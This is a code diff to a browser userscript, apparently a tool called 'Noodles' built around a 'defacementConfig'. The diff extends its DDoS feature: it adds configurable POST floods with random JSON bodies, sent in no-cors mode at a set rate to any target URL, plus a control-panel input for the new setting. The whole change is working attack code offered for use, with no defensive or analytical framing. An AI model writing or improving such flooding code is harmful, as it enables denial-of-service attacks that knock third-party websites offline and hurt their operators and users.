@@ -59,7 +59,8 @@
             ddosEnabled: GM_getValue(storageKeyPrefix + 'ddosEnabled', false),
             ddosTarget: GM_getValue(storageKeyPrefix + 'ddosTarget', ''),
             ddosThreads: GM_getValue(storageKeyPrefix + 'ddosThreads', 10),
-            ddosRate: GM_getValue(storageKeyPrefix + 'ddosRate', 100)
+            ddosRate: GM_getValue(storageKeyPrefix + 'ddosRate', 100),
+            ddosRandomStringLength: GM_getValue(storageKeyPrefix + 'ddosRandomStringLength', 50)
         };
     };
 
@@ -443,15 +444,33 @@
         const targetURL = defacementConfig.ddosTarget;
         const numThreads = defacementConfig.ddosThreads;
         const requestsPerSecond = defacementConfig.ddosRate;
+        const randomStringLength = defacementConfig.ddosRandomStringLength;
+
+        const generateRandomString = (length) => {
+            let result = '';
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            const charactersLength = characters.length;
+            for (let i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() * charactersLength));
+            }
+            return result;
+        };
 
         const attack = async () => {
             try {
                 for (let i = 0; i < requestsPerSecond; i++) {
-                    fetch(targetURL, { mode: 'no-cors' })
-                        .catch(error => {
-                            //console.error('Noodles: DDoS Request Failed:', error); //Reduce console noise
-                            //logError('DDoS Request Failed: ' + error.message); //Reduce log noise
-                        });
+                    const randomString = generateRandomString(randomStringLength);
+                    const payload = { data: randomString };
+
+                    fetch(targetURL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify(payload) // Send data with the request
+                    })
+                    .catch(error => {
+                        //console.error('Noodles: DDoS Request Failed:', error); //Reduce console noise
+                        //logError('DDoS Request Failed: ' + error.message); //Reduce log noise
+                    });
                 }
             } catch (e) {
                 console.error('Noodles: DDoS Failed:', e);
@@ -711,6 +730,7 @@
         panel.appendChild(createInput('DDoS Target URL', 'ddosTarget'));
         panel.appendChild(createNumberInput('DDoS Threads', 'ddosThreads'));
         panel.appendChild(createNumberInput('DDoS Rate (Requests/sec)', 'ddosRate'));
+        panel.appendChild(createNumberInput('DDoS Random String Length', 'ddosRandomStringLength')); // Add the new input
 
         panel.appendChild(refreshButton);
         panel.appendChild(resetButton);
